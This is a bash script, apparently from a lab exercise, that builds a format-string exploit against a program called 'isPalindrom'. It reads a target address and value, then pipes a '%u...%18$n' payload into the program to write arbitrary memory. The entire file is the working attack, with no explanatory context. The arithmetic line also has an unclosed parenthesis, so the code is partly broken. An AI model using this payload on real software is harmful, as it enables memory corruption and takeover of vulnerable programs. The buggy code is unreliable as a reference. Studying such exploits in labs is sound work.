#!/bin/bash

if [[ -x "$1" ]]; then
    prog="$1"
else
  echo "Usage: $(basename $0) path_to_isPalindrom"
  exit 1
fi
    
echo -n "Enter address where to write to (e.g. 0x0123456789ABCDEF): "
read addressStr
echo -n "Enter value to be written (dec or hex):"
read valueStr

valueStr=$(($valueStr) #convert if it's in hex
address="$(echo $addressStr | sed -e 's/.\{2\}/&\\x/g' | sed -e 's/^/\\x/' | sed -e 's/\\x$//')"
value="$(($valueStr-7))"

attackStr="${address}\%${value}u\%18\$n"

echo -e "$attackStr" | $(realpath $prog)
